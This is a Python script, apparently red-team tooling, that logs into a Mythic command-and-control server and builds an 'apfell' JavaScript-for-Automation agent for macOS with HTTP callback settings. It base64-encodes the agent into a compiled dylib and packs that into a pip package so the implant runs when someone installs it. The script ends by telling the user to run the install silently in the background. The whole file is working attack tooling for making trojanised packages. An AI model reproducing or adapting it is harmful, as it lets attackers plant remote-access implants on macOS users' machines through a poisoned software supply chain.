import shutil, errno, os, base64
from mythic import mythic_rest
from sys import exit
import subprocess
from Settings.MythicSettings import *

def pip_package_dylib():
    temp = "./Templates/Python_PIP_Package_Dylib/"
    payload = "./Payloads/Python_PIP_Package_Payload_Dylib/"

    def copyanything(src, dst):
        try:
            shutil.copytree(src, dst)
            print("Copied Template Folder to '% s'" % payload)
        except OSError as error:
        	shutil.rmtree(dst)
        	shutil.copytree(src, dst)
        	print("Overwrote files '%s'" % payload)

    copyanything(temp,payload)
    copyanything("./Templates/JXADylib_Runner/JXADylib_Runner/","./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/")

    ## Create apfell payload
    async def scripting():
        mythic = mythic_rest.Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        p = mythic_rest.Payload(
            # what payload type is it
            payload_type="apfell", 
            c2_profiles={
                "http":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval},
                        {"name": "callback_port", "value": mythic_http_callback_port}
                    ]
                },
            # give our payload a description if we want
            tag="Python PIP Package W/Dylib",
            selected_os="macOS",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            filename="Python_PIP_Package_Dylib.js")
        print("[+] Creating new apfell payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)
        payloadDownloadid = resp.response.file["agent_file_id"]

        # Replace template values
        #templateString = "UpdateDyLibPath"
        modifyFile = payload + "/Pip_Files/setup.py"

        #url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid # modify to point to desired location

       # fin = open(modifyFile, "rt")
       # data = fin.read()
       # data = data.replace(templateString, url)
       # fin.close()

        #fin = open(modifyFile, "wt")
        #fin.write(data)
        #fin.close()

        #  Build the payload
        payload_contents = await mythic.download_payload(resp.response)
        pkg_payload = payload + "/Python_PIP_Package_Dylib.js"
        with open(pkg_payload, "wb") as f:
            f.write(payload_contents)  # write out to disk

        #Modify the runner
        templateString = "BASE64 ENCODED APFELL PAYLOAD HERE"
        fin = open(payload + "Python_PIP_Package_Dylib.js", "rt")
        orgPayload = fin.read()
        fin.close()

        #base64 Payload
        message_bytes = orgPayload.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')


        fin = open("./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/JSRunner.mm", "rt")
        data = fin.read()
        data = data.replace(templateString, base64_message)
        fin.close()

        fin = open("./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/JSRunner.mm", "wt")
        fin.write(data)
        fin.close()

        os.system("g++ -dynamiclib -o /private/tmp/pipsetup.dylib -framework Foundation -framework OSAKit ./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/plugin.cpp ./Payloads/Python_PIP_Package_Payload_Dylib/JXADylib_Runner/jsrunner.mm")
        os.system("mv /private/tmp/pipsetup.dylib ./Payloads/Python_PIP_Package_Payload_Dylib/Pip_Files/pipsetup.dylib")
        #os.system("rm ./Payloads/Python_PIP_Package_Payload_Dylib/Python_PIP_Package_Dylib.js")

        print("[*] Building Python PIP Package")
        os.system("chmod +x " + modifyFile)
        print("[*] Done! Execute using Python 'nohup pip install . > /dev/null 2>&1&' within 'Pip_Files' folder")

    async def main():
        await scripting()
        try:
            while True:
                pending = mythic_rest.asyncio.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await mythic_rest.asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = mythic_rest.asyncio.all_tasks()
            for t in pending:
                t.cancel()    

    loop = mythic_rest.asyncio.get_event_loop()
    loop.run_until_complete(main())
